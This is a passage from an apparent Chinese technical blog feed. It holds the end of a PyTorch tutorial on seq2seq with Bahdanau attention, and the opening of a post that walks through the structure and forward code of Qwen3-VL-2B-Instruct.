            torch.Tensor: 注意力加权后的值向量。形状为 (批量大小, 查询数量, 值维度)。
        """
        # 1. 线性变换：分别对 Q 和 K 进行投影
        queries, keys = self.W_q(queries), self.W_k(keys)
        
        # 2. 维度扩展与相加（Attention Scoring 的核心步骤）
        # queries.unsqueeze(2): 形状从 (批量大小, 查询数量, num_hiddens) 
        #                       变为 (批量大小, 查询数量, 1, num_hiddens)。
        # keys.unsqueeze(1): 形状从 (批量大小, 键值对数量, num_hiddens) 
        #                     变为 (批量大小, 1, 键值对数量, num_hiddens)。
        # 两个张量通过广播机制相加，得到 features，形状为：
        # (批量大小, 查询数量, 键值对数量, num_hiddens)
        features = queries.unsqueeze(2) + keys.unsqueeze(1)
        
        # 3. 激活函数：应用 tanh 激活（加性注意力机制的要求）
        features = torch.tanh(features)
        
        # 4. 投影到标量分数
        # self.w_v(features): 将 features 的最后一个维度（num_hiddens）投影成 1。
        # scores.squeeze(-1): 移除最后一个单维度 (1)，得到最终的注意力分数张量。
        # 形状为：(批量大小, 查询数量, 键值对数量)
        scores = self.w_v(features).squeeze(-1)
        
        # 5. 归一化（Softmax）：使用带掩码的 Softmax 得到注意力权重
        # 填充部分的得分会被设置为一个极小的负值，Softmax 后权重趋近于 0。
        self.attention_weights = masked_softmax(scores, valid_lens)
        
        # 6. 加权求和
        # torch.bmm: 批量矩阵乘法 (Batch Matrix Multiplication)。
        # 将 [注意力权重] (批量, Q数量, K数量) 与 [值向量] (批量, K数量, V维度) 相乘
        # 得到最终的注意力输出，形状为：(批量大小, 查询数量, 值维度)
        # 在 BMM 之前，对注意力权重应用 Dropout。
        return torch.bmm(self.dropout(self.attention_weights), values)


#@save
class Seq2SeqEncoder(Encoder):
    """用于序列到序列学习的循环神经网络编码器"""
    def __init__(self, vocab_size, embed_size, num_hiddens, num_layers,
                 dropout=0, **kwargs):
        super(Seq2SeqEncoder, self).__init__(**kwargs)
        # 嵌入层
        self.embedding = nn.Embedding(vocab_size, embed_size)
        self.rnn = nn.GRU(embed_size, num_hiddens, num_layers,
                          dropout=dropout)
        # self.lstm = nn.LSTM(embed_size, num_hiddens, num_layers)

    def forward(self, X, *args):
        # 输入X.shape = (batch_size,num_steps)
        # 输出'X'的形状：(batch_size,num_steps,embed_size)
        X = self.embedding(X)
        # 在循环神经网络模型中，第一个轴对应于时间步
        X = X.permute(1, 0, 2)
        # 如果未提及状态，则默认为0
        output, state = self.rnn(X)
        # output : 这个返回值是所有时间步的隐藏状态序列
        # output的形状:(num_steps,batch_size,num_hiddens)
        # hn (hidden) : 这是每一层rnn的最后一个时间步的隐藏状态
        # state的形状:(num_layers,batch_size,num_hiddens)
        return output, state
    
class AttentionDecoder(Decoder):  #@save
    """The base attention-based decoder interface."""
    def __init__(self):
        super().__init__()

    @property
    def attention_weights(self):
        raise NotImplementedError
    
class Seq2SeqAttentionDecoder(AttentionDecoder):
    def __init__(self, vocab_size, embed_size, num_hiddens, num_layers,
                 dropout=0):
        super().__init__()
        self.attention = AdditiveAttention(num_hiddens, dropout)
        self.embedding = nn.Embedding(vocab_size, embed_size)
        self.rnn = nn.GRU(
            embed_size + num_hiddens, num_hiddens, num_layers,
            dropout=dropout)
        self.dense = nn.LazyLinear(vocab_size)
        # self.apply(d2l.init_seq2seq)

    def init_state(self, enc_outputs, enc_valid_lens):
        # Shape of outputs: (num_steps, batch_size, num_hiddens).
        # Shape of hidden_state: (num_layers, batch_size, num_hiddens)
        outputs, hidden_state = enc_outputs
        return (outputs.permute(1, 0, 2), hidden_state, enc_valid_lens)

    def forward(self, X, state):
        # Shape of enc_outputs: (batch_size, num_steps, num_hiddens).
        # Shape of hidden_state: (num_layers, batch_size, num_hiddens)
        enc_outputs, hidden_state, enc_valid_lens = state
        # Shape of the output X: (num_steps, batch_size, embed_size)
        X = self.embedding(X).permute(1, 0, 2)
        outputs, self._attention_weights = [], []
        for x in X:
            # Shape of query: (batch_size, 1, num_hiddens)
            query = torch.unsqueeze(hidden_state[-1], dim=1)
            # Shape of context: (batch_size, 1, num_hiddens)
            context  = self.attention(
                query, enc_outputs, enc_outputs, enc_valid_lens)
            # Concatenate on the feature dimension
            x = torch.cat((context, torch.unsqueeze(x, dim=1)), dim=-1)
            # Reshape x as (1, batch_size, embed_size + num_hiddens)
            out, hidden_state = self.rnn(x.permute(1, 0, 2), hidden_state)
            outputs.append(out)
            self._attention_weights.append(self.attention.attention_weights)
        # After fully connected layer transformation, shape of outputs:
        # (num_steps, batch_size, vocab_size)
        outputs = self.dense(torch.cat(outputs, dim=0))
        return outputs.permute(1, 0, 2), [enc_outputs, hidden_state,
                                          enc_valid_lens]

    @property
    def attention_weights(self):
        return self._attention_weights

    
def try_gpu(i=0):
    """如果存在，则返回gpu(i)，否则返回cpu()

    Defined in :numref:`sec_use_gpu`"""
    if torch.cuda.device_count() >= i + 1:
        return torch.device(f'cuda:&#123;i&#125;')
    return torch.device('cpu')

def sequence_mask(X, valid_len, value=0):
    """在序列中屏蔽不相关的项"""
    maxlen = X.size(1)
    mask = torch.arange((maxlen), dtype=torch.float32,
                        device=X.device)[None, :] &lt; valid_len[:, None]
    X[~mask] = value
    return X

class MaskedSoftmaxCELoss(nn.CrossEntropyLoss):
    """带遮蔽的softmax交叉熵损失函数"""
    # pred的形状：(batch_size,num_steps,vocab_size)
    # label的形状：(batch_size,num_steps)
    # valid_len的形状：(batch_size,)
    def forward(self, pred, label, valid_len):
        weights = torch.ones_like(label)
        weights = sequence_mask(weights, valid_len)
        self.reduction='none'
        unweighted_loss = super(MaskedSoftmaxCELoss, self).forward(
            pred.permute(0, 2, 1), label)
        weighted_loss = (unweighted_loss * weights).mean(dim=1)
        return weighted_loss
    
def grad_clipping(net, theta):  #@save
    """裁剪梯度"""
    if isinstance(net, nn.Module):
        params = [p for p in net.parameters() if p.requires_grad]
    else:
        params = net.params
    norm = torch.sqrt(sum(torch.sum((p.grad ** 2)) for p in params))
    if norm > theta:
        for param in params:
            param.grad[:] *= theta / norm

def train_seq2seq(net, data_iter, lr, num_epochs, tgt_vocab, device):
    """训练序列到序列模型"""
    def xavier_init_weights(m):
        if type(m) == nn.Linear:
            nn.init.xavier_uniform_(m.weight)
        if type(m) == nn.GRU:
            for param in m._flat_weights_names:
                if "weight" in param:
                    nn.init.xavier_uniform_(m._parameters[param])

    net.apply(xavier_init_weights)
    net.to(device)
    optimizer = torch.optim.Adam(net.parameters(), lr=lr)
    loss = MaskedSoftmaxCELoss()
    net.train()
    vis = visdom.Visdom(env=u'test1', server="http://127.0.0.1", port=8097)
    animator = vis
    for epoch in range(num_epochs):
        timer = Timer()
        metric = Accumulator(2)  # 训练损失总和，词元数量
        for batch in data_iter:
            #清零（reset）优化器中的梯度缓存
            optimizer.zero_grad()
            # x.shape = [batch_size, num_steps]
            X, X_valid_len, Y, Y_valid_len = [x.to(device) for x in batch]
            # bos.shape = batch_size 个 bos-id
            bos = torch.tensor([tgt_vocab['&lt;bos>']] * Y.shape[0],
                          device=device).reshape(-1, 1)
            # dec_input.shape = (batch_size, num_steps)
            # 解码器的输入通常由序列的起始标志 bos 和目标序列（去掉末尾的部分 Y[:, :-1]）组成。
            dec_input = torch.cat([bos, Y[:, :-1]], 1)  # 强制教学
            # Y_hat的形状:(batch_size,num_steps,vocab_size)
            Y_hat, _ = net(X, dec_input, X_valid_len)
            l = loss(Y_hat, Y, Y_valid_len)
            l.sum().backward()      # 损失函数的标量进行“反向传播”
            grad_clipping(net, 1)
            num_tokens = Y_valid_len.sum()
            optimizer.step()
            with torch.no_grad():
                metric.add(l.sum(), num_tokens)

        if (epoch + 1) % 10 == 0:
            # print(predict('你是？'))
            # print(epoch)
            # animator.add(epoch + 1, )

            if epoch == 9:
                # 清空图表：使用空数组来替换现有内容
                vis.line(X=np.array([0]), Y=np.array([0]), win='train_ch8', update='replace')
            # _loss_val = l
            # _loss_val = _loss_val.cpu().sum().detach().numpy()
            vis.line(
                X=np.array([epoch + 1]),
                Y=[ metric[0] / metric[1]],
                win='train_ch8',
                update='append',
                opts=&#123;
                    'title': 'train_ch8',
                    'xlabel': 'epoch',
                    'ylabel': 'loss',
                    'linecolor': np.array([[0, 0, 255]]),  # 蓝色线条
                &#125;
            )
    print(f'loss &#123;metric[0] / metric[1]:.3f&#125;, &#123;metric[1] / timer.stop():.1f&#125; '
        f'tokens/sec on &#123;str(device)&#125;')
    torch.save(net.cpu().state_dict(), 'model_h.pt')  # [[6]]
    torch.save(net.cpu(), 'model.pt')  # [[6]]

def predict_seq2seq(net, src_sentence, src_vocab, tgt_vocab, num_steps,
                    device, save_attention_weights=False):
    """序列到序列模型的预测"""
    # 在预测时将net设置为评估模式
    net.eval()
    src_tokens = src_vocab[src_sentence.lower().split(' ')] + [
        src_vocab['&lt;eos>']]
    enc_valid_len = torch.tensor([len(src_tokens)], device=device)
    src_tokens = dataset.truncate_pad(src_tokens, num_steps, src_vocab['&lt;pad>'])
    # 添加批量轴
    enc_X = torch.unsqueeze(
        torch.tensor(src_tokens, dtype=torch.long, device=device), dim=0)
    enc_outputs = net.encoder(enc_X, enc_valid_len)
    dec_state = net.decoder.init_state(enc_outputs, enc_valid_len)
    # 添加批量轴
    dec_X = torch.unsqueeze(torch.tensor(
        [tgt_vocab['&lt;bos>']], dtype=torch.long, device=device), dim=0)
    output_seq, attention_weight_seq = [], []
    for _ in range(num_steps):
        Y, dec_state = net.decoder(dec_X, dec_state)
        # 我们使用具有预测最高可能性的词元，作为解码器在下一时间步的输入
        dec_X = Y.argmax(dim=2)
        pred = dec_X.squeeze(dim=0).type(torch.int32).item()
        # 保存注意力权重（稍后讨论）
        if save_attention_weights:
            attention_weight_seq.append(net.decoder.attention_weights[0].reshape(num_steps).cpu())
        # 一旦序列结束词元被预测，输出序列的生成就完成了
        if pred == tgt_vocab['&lt;eos>']:
            break
        output_seq.append(pred)
    return ' '.join(tgt_vocab.to_tokens(output_seq)), attention_weight_seq


def bleu(pred_seq, label_seq, k):  #@save
    """计算BLEU"""
    pred_tokens, label_tokens = pred_seq.split(' '), [i for i in label_seq]
    len_pred, len_label = len(pred_tokens), len(label_tokens)
    score = math.exp(min(0, 1 - len_label / len_pred))
    for n in range(1, k + 1):
        num_matches, label_subs = 0, collections.defaultdict(int)
        for i in range(len_label - n + 1):
            label_subs[' '.join(label_tokens[i: i + n])] += 1
        for i in range(len_pred - n + 1):
            if label_subs[' '.join(pred_tokens[i: i + n])] > 0:
                num_matches += 1
                label_subs[' '.join(pred_tokens[i: i + n])] -= 1
        score *= math.pow(num_matches / (len_pred - n + 1), math.pow(0.5, n))
    return score


from matplotlib import pyplot as plt
import matplotlib
# from matplotlib_inline import backend_inline
def show_heatmaps(matrices, xlabel, ylabel, titles=None, figsize=(2.5, 2.5),
                  cmap='Reds'):
    """
    显示矩阵的热图（Heatmaps）。
    这个函数旨在以子图网格的形式绘制多个矩阵，通常用于可视化注意力权重等。

    参数:
        matrices (numpy.ndarray 或 torch.Tensor 数组): 
            一个四维数组，形状应为 (num_rows, num_cols, height, width)。
            其中，num_rows 和 num_cols 决定了子图网格的布局，
            height 和 width 是每个热图（即每个矩阵）的维度。
        xlabel (str): 
            所有最底行子图的 x 轴标签。
        ylabel (str): 
            所有最左列子图的 y 轴标签。
        titles (list of str, optional): 
            一个包含 num_cols 个标题的列表，用于设置每一列子图的标题。默认 None。
        figsize (tuple, optional): 
            整个图形（figure）的大小。默认 (2.5, 2.5)。
        cmap (str, optional): 
            用于绘制热图的颜色映射（colormap）。默认 'Reds'。
    """
    # 导入所需的 matplotlib 模块，确保图形在 Jupyter/IPython 环境中正确显示为 SVG 格式
    # （假设在包含这个函数的环境中已经导入了 matplotlib 的 backend_inline）
    # backend_inline.set_matplotlib_formats('svg')
    matplotlib.use('TkAgg')
    # 从输入的 matrices 形状中解构出子图网格的行数和列数
    # 假设 matrices 的形状是 (num_rows, num_cols, height, width)
    num_rows, num_cols, _, _ = matrices.shape
    
    # 创建一个包含多个子图（axes）的图形（fig）
    # fig: 整个图形对象
    # axes: 一个 num_rows x num_cols 的子图对象数组
    fig, axes = plt.subplots(
        num_rows, num_cols, 
        figsize=figsize,
        sharex=True,    # 所有子图共享 x 轴刻度
        sharey=True,    # 所有子图共享 y 轴刻度
        squeeze=False   # 即使只有一行或一列，也强制返回二维数组的 axes，方便后续循环
    )
    
    # 遍历子图的行和对应的矩阵行
    # i 是行索引, row_axes 是当前行的子图数组, row_matrices 是当前行的矩阵数组
    for i, (row_axes, row_matrices) in enumerate(zip(axes, matrices)):
        # 遍历当前行中的子图和对应的矩阵
        # j 是列索引, ax 是当前的子图对象, matrix 是当前的待绘矩阵
        for j, (ax, matrix) in enumerate(zip(row_axes, row_matrices)):
            
            # 使用 ax.imshow() 绘制热图
            # matrix.detach().numpy()：将 PyTorch Tensor 转换为 numpy 数组，并从计算图中分离（如果它是 Tensor）
            # cmap：指定颜色映射
            pcm = ax.imshow(matrix.detach().numpy(), cmap=cmap)
            
            # --- 设置轴标签和标题 ---
            
            # 只有最底行 (i == num_rows - 1) 的子图才显示 x 轴标签
            if i == num_rows - 1:
                ax.set_xlabel(xlabel)
                
            # 只有最左列 (j == 0) 的子图才显示 y 轴标签
            if j == 0:
                ax.set_ylabel(ylabel)
                
            # 如果提供了标题列表，则设置当前列的子图标题（所有行共享列标题）
            if titles:
                ax.set_title(titles[j])
                
    # --- 添加颜色条（Colorbar） ---
    
    # 为整个图形添加一个颜色条，用于表示数值和颜色的对应关系
    # pcm: 之前绘制的第一个热图返回的 Colormap 
    # ax=axes: 颜色条将参照整个子图网格进行定位和缩放
    # shrink=0.6: 缩小颜色条的高度/长度，使其只占图形高度的 60%
    fig.colorbar(pcm, ax=axes, shrink=0.6)
    plt.show()

if __name__ == '__main__':
    embed_size, num_hiddens, num_layers, dropout = 32, 32, 2, 0.1
    batch_size, num_steps = 64, 10
    lr, num_epochs, device = 0.005, 2000, try_gpu()
    # train_iter 每个迭代输出：(batch_size, num_steps)
    train_iter, src_vocab, tgt_vocab, source, target = dataset.load_data(batch_size, num_steps)
    encoder = Seq2SeqEncoder(len(src_vocab), embed_size, num_hiddens, num_layers,
                        dropout)
    decoder = Seq2SeqAttentionDecoder(len(tgt_vocab), embed_size, num_hiddens, num_layers,
                            dropout)
    net = EncoderDecoder(encoder, decoder)

    is_train = False
    is_show = False
    if is_train:
        train_seq2seq(net, train_iter, lr, num_epochs, tgt_vocab, device)
    elif is_show:
        state_dict = torch.load('model_h.pt')
        net.load_state_dict(state_dict)
        net.to(device)

        src_text = "Call us."
        translation, attention_weight_seq = predict_seq2seq(
                net, src_text, src_vocab, tgt_vocab, num_steps, device, True)
        # attention_weights = torch.eye(10).reshape((1, 1, 10, 10))
        # (num_rows, num_cols, height, width)
        print(f'translation=&#123;translation&#125;')
        print(attention_weight_seq)

        stacked_tensor = torch.stack(attention_weight_seq, dim=0)
        stacked_tensor = stacked_tensor.unsqueeze(0).unsqueeze(0)
        show_heatmaps(
            stacked_tensor,
            xlabel='Attention weight', ylabel='Decode Step')
    else:
        state_dict = torch.load('model_h.pt')
        net.load_state_dict(state_dict)
        net.to(device)
        C = 0
        C1 = 0
        for i in range(2000):
            # print(source[i])
            # print(target[i])
            translation, attention_weight_seq = predict_seq2seq(
                net, source[i], src_vocab, tgt_vocab, num_steps, device)
            
            score = bleu(translation, target[i], k=2)
            if score > 0.0:
                C = C + 1
                if score > 0.8:
                    C1 = C1 + 1
                print(f'&#123;source[i]&#125; => &#123;translation&#125;, bleu &#123;score:.3f&#125;')

        print(f'Counter(bleu > 0) = &#123;C&#125;')
        print(f'Valid-Counter(bleu > 0.8) = &#123;C1&#125;')
  下面是encoder过程的简单分析：


将x通过nn.Embedding得到了(batch_size,num_steps,embed_size)的输入嵌入向量。


将嵌入向量传给nn.GRU，得到了两个输出，并返回：

output，最后一层rnn的所有时间步的隐藏状态（num_steps,batch_size,num_hiddens）。
h_n,所有rnn层的，最后一个时间步的隐藏状态（num_layers,batch_size,num_hiddens）。



  下面是decoder过程的简单分析：


将decoder_x通过nn.Embedding得到了(batch_size,num_steps,embed_size)的输入嵌入向量。


将嵌入向量沿着num_steps进行单步运行，每一步经过Attention过程，得到最终的output，以及最后一个时间步的所有rnn层的h_n，每一步执行如下步骤：

将rnn最后一层的隐藏态作为Q（第一次Q是来自于encoder，后续都是decoder的每一次运行过程产生的隐藏态）
将encoder的output作为K,V，得到当前动态的上下文 context
将decoder_x_step 和 context进行组合，得到decoder_x_step_new
将decoder_x_step_new送入nn.GRU，得到当前时间步的output, h_t
将每一步的output收集起来作为输出，将h_t作为下一个时间步的Q循环起来



将所有的output经过nn.LazyLinear 映射为(num_steps, batch_size, vocab_size)，并和h_t返回


  和原版本的seq2seq进行对比可知：


在原版中，我们的decoder依赖于一个固定的enc_outputs进行循环解码


在新版中，我们的decoder每次界面，都会有一个Q（第一次是来至于encoder，后续都是decoder的每一次运行过程产生的隐藏态）来计算enc_outputs的权重分数，然后根据权重分数得到一个动态的enc_outputs，这样可以让解码器每一步都关注enc_outputs中的不同的重点。


  attention weight 的解释：


把Encoder Output（num_steps,1,num_hiddens）作为K,V


将Decoder的隐藏态h_t（1,1,num_hiddens）(初始值来自于Encoder的隐藏态h_t)作为Q，计算出当前step的attention_weight，其是一个softmax概率数据。


然后将attention_weight 与 V进行计算，代表模型当前关注EncoderOutput的那部分数据，得到新的Context


  下面是训练和测试的一些结果

    
        
    
   

    
        
    
   
  从上面的图可以看到，这个模型有一定的翻译效果，并且，比上一篇文章的模型效果要好一点。
  此外，下面是我们翻译：“Call us.”-&gt; “联 系 我 们 。” 的attention weight的可视化（带mask=3，在不同的decode step中权重变化。）

    
        
    
   
  从上面的图可以知道，每一个decode step的注意力权重矩阵值都不一样，意味着，每一步解码的时候，关注的内容也不一样。




后记

  本文引入了注意力机制，及注意力机制在seq2seq中，在应用注意力机制后，和原版的seq2seq的结论相比，模型效果有提升。
参考文献


https://zh.d2l.ai/chapter_recurrent-modern/encoder-decoder.html


https://zh.d2l.ai/chapter_recurrent-modern/seq2seq.html


https://d2l.ai/chapter_attention-mechanisms-and-transformers/bahdanau-attention.html







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>深度学习</category>
        <category>NLP</category>
        <category>LLM</category>
        <category>LM</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
        <tag>NLP</tag>
        <tag>LLM</tag>
        <tag>LM</tag>
        <tag>seq2seq</tag>
        <tag>attention</tag>
      </tags>
  </entry>
  <entry>
    <title>大模型基础补全计划(八)---相关知识点回顾与Qwen3-VL-2B-Instruct实例分析(终章)</title>
    <url>/2025/11/30/blog_idx_145/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

   本文是这个系列第八篇，也是本系列的终章，它们是：


《大模型基础补全计划(一)—重温一些深度学习相关的数学知识》 https://www.cnblogs.com/Iflyinsky/p/18717317


《大模型基础补全计划(二)—词嵌入(word embedding) 》 https://www.cnblogs.com/Iflyinsky/p/18775451


《大模型基础补全计划(三)—RNN实例与测试》 https://www.cnblogs.com/Iflyinsky/p/18967569


《大模型基础补全计划(四)—LSTM的实例与测试(RNN的改进)》 https://www.cnblogs.com/Iflyinsky/p/19091089


《大模型基础补全计划(五)—seq2seq实例与测试(编码器、解码器架构)》 https://www.cnblogs.com/Iflyinsky/p/19150535


《大模型基础补全计划(六)—带注意力机制的seq2seq实例与测试(Bahdanau Attention)》 https://www.cnblogs.com/Iflyinsky/p/19184558


《大模型基础补全计划(七)—Transformer(多头注意力、自注意力、位置编码)及实例与测试》https://www.cnblogs.com/Iflyinsky/p/19228410


  本文主要是用一个实际的大模型例子来联系和回顾之前的知识点，让大家能够感受一些，前面文中的一些知识点是真正用到了实际大模型里面的哪些地方。
  由于近期正在学习和应用的Qwen3-VL系列相关模型，因此这里挑了一个Qwen3-VL-2B-Instruct来独立分析，并联系和回顾之前的知识点。
  注意：本文不会详细介绍Qwen3-VL-2B-Instruct的推理过程及原理，如果想学习详细的技术原理，请忽略本文内容，并查看其它相关的文章。




Qwen3-VL-2B-Instruct 简介

  


下载及运行
   首先qwen3-vl的官方工程是 https://github.com/QwenLM/Qwen3-VL ，下面的官方示例的下载及变更推理代码（由于国内的原因，从魔塔下载）：
modelscope download --model Qwen/Qwen3-VL-2B-Instruct  --local_dir ./cache
from transformers import AutoModelForImageTextToText, AutoProcessor

model_path = "./cache"

# default: Load the model on the available device(s)
model = AutoModelForImageTextToText.from_pretrained(
    model_path, cache_dir=model_path, dtype="auto", device_map="auto"
)

# We recommend enabling flash_attention_2 for better acceleration and memory saving, especially in multi-image and video scenarios.
# model = AutoModelForImageTextToText.from_pretrained(
#     "Qwen/Qwen3-VL-235B-A22B-Instruct",
#     dtype=torch.bfloat16,
#     attn_implementation="flash_attention_2",
#     device_map="auto",
# )

processor = AutoProcessor.from_pretrained(model_path, cache_dir=model_path)

messages = [
    &#123;
        "role": "user",
        "content": [
            &#123;
                "type": "image",
                "image": "https://qianwen-res.oss-cn-beijing.aliyuncs.com/Qwen-VL/assets/demo.jpeg",
            &#125;,
            &#123;"type": "text", "text": "Describe this image."&#125;,
        ],
    &#125;
]

# Preparation for inference
inputs = processor.apply_chat_template(
    messages,
    tokenize=True,
    add_generation_prompt=True,
    return_dict=True,
    return_tensors="pt"
)
inputs = inputs.to(model.device)

# Inference: Generation of the output
generated_ids = model.generate(**inputs, max_new_tokens=128)
generated_ids_trimmed = [
    out_ids[len(in_ids) :] for in_ids, out_ids in zip(inputs.input_ids, generated_ids)
]
output_text = processor.batch_decode(
    generated_ids_trimmed, skip_special_tokens=True, clean_up_tokenization_spaces=False
)
print(output_text)




模型结构
   我们在上面的例子基础上，添加如下代码打印其模型结构：
print(model)
vit_model = model.visual
llm_model = model.language_model 
  得到的模型结构如下：
Qwen3VLForConditionalGeneration(
  (model): Qwen3VLModel(
    (visual): Qwen3VLVisionModel(
      (patch_embed): Qwen3VLVisionPatchEmbed(
        (proj): Conv3d(3, 1024, kernel_size&#x3D;(2, 16, 16), stride&#x3D;(2, 16, 16))
      )
      (pos_embed): Embedding(2304, 1024)
      (rotary_pos_emb): Qwen3VLVisionRotaryEmbedding()
      (blocks): ModuleList(
        (0-23): 24 x Qwen3VLVisionBlock(
          (norm1): LayerNorm((1024,), eps&#x3D;1e-06, elementwise_affine&#x3D;True)
          (norm2): LayerNorm((1024,), eps&#x3D;1e-06, elementwise_affine&#x3D;True)
          (attn): Qwen3VLVisionAttention(
            (qkv): Linear(in_features&#x3D;1024, out_features&#x3D;3072, bias&#x3D;True)
            (proj): Linear(in_features&#x3D;1024, out_features&#x3D;1024, bias&#x3D;True)
          )
          (mlp): Qwen3VLVisionMLP(
            (linear_fc1): Linear(in_features&#x3D;1024, out_features&#x3D;4096, bias&#x3D;True)
            (linear_fc2): Linear(in_features&#x3D;4096, out_features&#x3D;1024, bias&#x3D;True)
            (act_fn): GELUTanh()
          )
        )
      )
      (merger): Qwen3VLVisionPatchMerger(
        (norm): LayerNorm((1024,), eps&#x3D;1e-06, elementwise_affine&#x3D;True)
        (linear_fc1): Linear(in_features&#x3D;4096, out_features&#x3D;4096, bias&#x3D;True)
        (act_fn): GELU(approximate&#x3D;&#39;none&#39;)
        (linear_fc2): Linear(in_features&#x3D;4096, out_features&#x3D;2048, bias&#x3D;True)
      )
      (deepstack_merger_list): ModuleList(
        (0-2): 3 x Qwen3VLVisionPatchMerger(
          (norm): LayerNorm((4096,), eps&#x3D;1e-06, elementwise_affine&#x3D;True)
          (linear_fc1): Linear(in_features&#x3D;4096, out_features&#x3D;4096, bias&#x3D;True)
          (act_fn): GELU(approximate&#x3D;&#39;none&#39;)
          (linear_fc2): Linear(in_features&#x3D;4096, out_features&#x3D;2048, bias&#x3D;True)
        )
      )
    )
    (language_model): Qwen3VLTextModel(
      (embed_tokens): Embedding(151936, 2048)
      (layers): ModuleList(
        (0-27): 28 x Qwen3VLTextDecoderLayer(
          (self_attn): Qwen3VLTextAttention(
            (q_proj): Linear(in_features&#x3D;2048, out_features&#x3D;2048, bias&#x3D;False)
            (k_proj): Linear(in_features&#x3D;2048, out_features&#x3D;1024, bias&#x3D;False)
            (v_proj): Linear(in_features&#x3D;2048, out_features&#x3D;1024, bias&#x3D;False)
            (o_proj): Linear(in_features&#x3D;2048, out_features&#x3D;2048, bias&#x3D;False)
            (q_norm): Qwen3VLTextRMSNorm((128,), eps&#x3D;1e-06)
            (k_norm): Qwen3VLTextRMSNorm((128,), eps&#x3D;1e-06)
          )
          (mlp): Qwen3VLTextMLP(
            (gate_proj): Linear(in_features&#x3D;2048, out_features&#x3D;6144, bias&#x3D;False)
            (up_proj): Linear(in_features&#x3D;2048, out_features&#x3D;6144, bias&#x3D;False)
            (down_proj): Linear(in_features&#x3D;6144, out_features&#x3D;2048, bias&#x3D;False)
            (act_fn): SiLUActivation()
          )
          (input_layernorm): Qwen3VLTextRMSNorm((2048,), eps&#x3D;1e-06)
          (post_attention_layernorm): Qwen3VLTextRMSNorm((2048,), eps&#x3D;1e-06)
        )
      )
      (norm): Qwen3VLTextRMSNorm((2048,), eps&#x3D;1e-06)
      (rotary_emb): Qwen3VLTextRotaryEmbedding()
    )
  )
  (lm_head): Linear(in_features&#x3D;2048, out_features&#x3D;151936, bias&#x3D;False)
)
  从上面的模型结构来看，我们可以知道其分为两个部分，一个是visual，一个是language_model，这也是现在的视觉多模态的常见结构。




Qwen3-VL-2B-Instruct 的模型结构简单分析 及 知识回顾

  还记得我们前面的模型中的词表这个概念吗？当时的做法是直接将将整个训练用到的文字映射成对应的id，将所有的id组合在一起作为一个词表。在现在的大模型中，其实就有类似的东西，一般放在tokenizer.json文件里面。对于当前这个模型来说，这里有几个特殊的东西说明一下：


以前文章中的&lt;bos&gt;/&lt;eos&gt;对应的是当前这个模型的&lt;|im_start|&gt;/&lt;|im_end|&gt;


由于是视觉多模态模型，当前这个模型还会有几个本文会用到的特殊token：&lt;|vision_start|&gt;/&lt;|image_pad|&gt;/&lt;|vision_end|&gt;，他们是用来描述一张图怎么被输入到大语言模型中被理解的。


一个token不一定对应一个文字，可能对应多个、或者零点几个字，感兴趣可以私下了解一下，其和文字编码有关系。


  当上文的 processor.apply_chat_template执行后，然后得到的inputs会有如下四个内容：


input_ids （做完tokenizer之后的输出，已经将输入的文字“Describe this image.”和图片占位符“&lt;|vision_start|&gt;&lt;|image_pad|&gt;*N&lt;|vision_end|&gt;”转换为了对应的token id）


attention_mask （input_ids的掩码，用于屏蔽无效或者pad输入序列）


pixel_values （图片预处理好的矩阵，不仅仅做了归一化，还做了分patch操作，本文不用太关注）


image_grid_thw （本文用不上，别管。）


  对于input_ids来说，我们知道里面有图片的占位符的token_id，这里后面会替换为真实的图像数据，这样才能把图、文字送入到大语言模型，当然，语音等也是一样的。
  我们首先来看看上文model.generate调用之后发生了什么，他会经过一系列变化后，到达如下的Qwen3VLModel的forward的入口：
def forward(
    self,
    input_ids: torch.LongTensor = None,
    attention_mask: Optional[torch.Tensor] = None,
    position_ids: Optional[torch.LongTensor] = None,
    past_key_values: Optional[Cache] = None,
    inputs_embeds: Optional[torch.FloatTensor] = None,
    pixel_values: Optional[torch.Tensor] = None,
    pixel_values_videos: Optional[torch.FloatTensor] = None,
    image_grid_thw: Optional[torch.LongTensor] = None,
    video_grid_thw: Optional[torch.LongTensor] = None,
    cache_position: Optional[torch.LongTensor] = None,
    **kwargs: Unpack[TransformersKwargs],
) -> Union[tuple, Qwen3VLModelOutputWithPast]:
    r"""
    image_grid_thw (`torch.LongTensor` of shape `(num_images, 3)`, *optional*):
        The temporal, height and width of feature shape of each image in LLM.
    video_grid_thw (`torch.LongTensor` of shape `(num_videos, 3)`, *optional*):
        The temporal, height and width of feature shape of each video in LLM.
    """
    if (input_ids is None) ^ (inputs_embeds is not None):
        raise ValueError("You must specify exactly one of input_ids or inputs_embeds")

    if inputs_embeds is None:
        inputs_embeds = self.get_input_embeddings()(input_ids)

    image_mask = None
    video_mask = None

    if pixel_values is not None:
        image_embeds, deepstack_image_embeds = self.get_image_features(pixel_values, image_grid_thw)
        image_embeds = torch.cat(image_embeds, dim=0).to(inputs_embeds.device, inputs_embeds.dtype)
        image_mask, _ = self.get_placeholder_mask(
            input_ids, inputs_embeds=inputs_embeds, image_features=image_embeds
        )
        inputs_embeds = inputs_embeds.masked_scatter(image_mask, image_embeds)

    if pixel_values_videos is not None:
        video_embeds, deepstack_video_embeds = self.get_video_features(pixel_values_videos, video_grid_thw)
        video_embeds = torch.cat(video_embeds, dim=0).to(inputs_embeds.device, inputs_embeds.dtype)
        _, video_mask = self.get_placeholder_mask(
            input_ids, inputs_embeds=inputs_embeds, video_features=video_embeds
        )
        inputs_embeds = inputs_embeds.masked_scatter(video_mask, video_embeds)

    visual_pos_masks = None
    deepstack_visual_embeds = None
    if image_mask is not None and video_mask is not None:
        # aggregate visual_pos_masks and deepstack_visual_embeds
        image_mask = image_mask[..., 0]
        video_mask = video_mask[..., 0]
        visual_pos_masks = image_mask | video_mask
        deepstack_visual_embeds = []
        image_mask_joint = image_mask[visual_pos_masks]
        video_mask_joint = video_mask[visual_pos_masks]
        for img_embed, vid_embed in zip(deepstack_image_embeds, deepstack_video_embeds):
            embed_joint = img_embed.new_zeros(visual_pos_masks.sum(), img_embed.shape[-1]).to(img_embed.device)
            embed_joint[image_mask_joint, :] = img_embed
